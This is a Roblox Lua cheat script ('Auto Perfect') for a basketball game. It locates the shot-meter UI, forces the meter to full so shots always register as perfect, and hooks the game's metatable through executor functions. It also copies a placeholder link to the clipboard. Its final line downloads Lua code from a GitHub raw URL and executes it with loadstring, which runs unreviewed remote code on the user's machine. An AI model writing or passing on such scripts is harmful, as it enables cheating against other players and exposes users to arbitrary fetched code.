local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

local isEnabled = true
local isHolding = false
local shotMeterUI = nil
local ShootingModule = nil

local function findShootingModule()
    local foundModule = nil
    
    local Knit = ReplicatedStorage:FindFirstChild("Packages")
    if Knit then Knit = Knit:FindFirstChild("Knit") end
    
    if not foundModule then
        for _, v in pairs(ReplicatedStorage:GetChildren()) do
            if v:IsA("ModuleScript") and v.Name:lower():find("shoot") then
                foundModule = v
                break
            end
        end
    end
    
    return foundModule
end

local function findShotMeter()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    
    for _, v in pairs(PlayerGui:GetChildren()) do
        if (v:IsA("ScreenGui")) and (v.Name:lower():find("shoot") or v.Name:lower():find("shot")) then
            local bar = v:FindFirstChild("Bar")
            if bar then return v end
        end
    end
    
    for _, screen in pairs(PlayerGui:GetChildren()) do
        if screen:IsA("ScreenGui") then
            for _, v in pairs(screen:GetChildren()) do
                if v:IsA("Frame") and (v.Name:lower():find("shoot") or v.Name:lower():find("shot")) then
                    local bar = v:FindFirstChild("Bar")
                    if bar then return v end
                end
            end
        end
    end
    
    local foundUI = nil
    local connection
    connection = PlayerGui.ChildAdded:Connect(function(v)
        if (v:IsA("ScreenGui")) and (v.Name:lower():find("shoot") or v.Name:lower():find("shot")) then
            local bar = v:FindFirstChild("Bar")
            if bar then 
                foundUI = v
                connection:Disconnect()
            end
        end
    end)
    
    delay(5, function()
        if connection.Connected then connection:Disconnect() end
    end)
    
    return foundUI
end

local lastFillTime = 0
local function fillShotMeter()
    local currentTime = tick()
    if currentTime - lastFillTime < 0.033 then return end
    lastFillTime = currentTime
    
    if shotMeterUI and shotMeterUI:FindFirstChild("Bar") and shotMeterUI.Visible then
        shotMeterUI.Bar.Size = UDim2.new(1, 0, 1, 0)
    end
end

local function setupShotMeter()
    if not shotMeterUI then return end
    
    shotMeterUI:GetPropertyChangedSignal("Visible"):Connect(function()
        if shotMeterUI.Visible then fillShotMeter() end
    end)
    
    local success, result = pcall(function()
        local mt = getrawmetatable(game)
        if not mt then return end
        
        local oldIndex = mt.__index
        setreadonly(mt, false)
        
        mt.__index = newcclosure(function(self, index)
            if (index == "Handle" or index == "handle") and typeof(self) == "table" and shotMeterUI and shotMeterUI.Visible then
                fillShotMeter()
            end
            return oldIndex(self, index)
        end)
        
        setreadonly(mt, true)
        return true
    end)
end

local function setupInputHandling()
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        local isShootInput = (
            input.UserInputType == Enum.UserInputType.MouseButton1 or
            input.KeyCode == Enum.KeyCode.Space or
            input.KeyCode == Enum.KeyCode.E or
            input.UserInputType == Enum.UserInputType.Touch
        )
        
        if isShootInput then isHolding = true end
    end)
    
    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        local isShootInput = (
            input.UserInputType == Enum.UserInputType.MouseButton1 or
            input.KeyCode == Enum.KeyCode.Space or
            input.KeyCode == Enum.KeyCode.E or
            input.UserInputType == Enum.UserInputType.Touch
        )
        
        if isShootInput then isHolding = false end
    end)
    
    RunService.RenderStepped:Connect(function()
        if not isEnabled then return end
        if (isHolding or (shotMeterUI and shotMeterUI.Visible)) then fillShotMeter() end
    end)
end

local function showNotifications()
    StarterGui:SetCore("SendNotification", {
        Title = "Auto Perfect",
        Text = "By Jaylen",
        Duration = 5
    })
    
    task.wait(1)
    
    StarterGui:SetCore("SendNotification", {
        Title = "Green Light",
        Text = "By Blossom",
        Duration = 5
    })
    
    local discordLink = "nil"
    setclipboard(discordLink)
end

spawn(function()
    ShootingModule = findShootingModule()
    shotMeterUI = findShotMeter()
    
    showNotifications()
    
    if shotMeterUI then
        setupShotMeter()
        setupInputHandling()
    else
        local checkInterval = 0
        RunService.Heartbeat:Connect(function(delta)
            checkInterval = checkInterval + delta
            if checkInterval >= 1 then
                checkInterval = 0
                if not shotMeterUI then
                    shotMeterUI = findShotMeter()
                    if shotMeterUI then
                        setupShotMeter()
                        setupInputHandling()
                    end
                end
            end
        end)
    end
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/blossom20500/scripts/refs/heads/main/script4.lua"))()
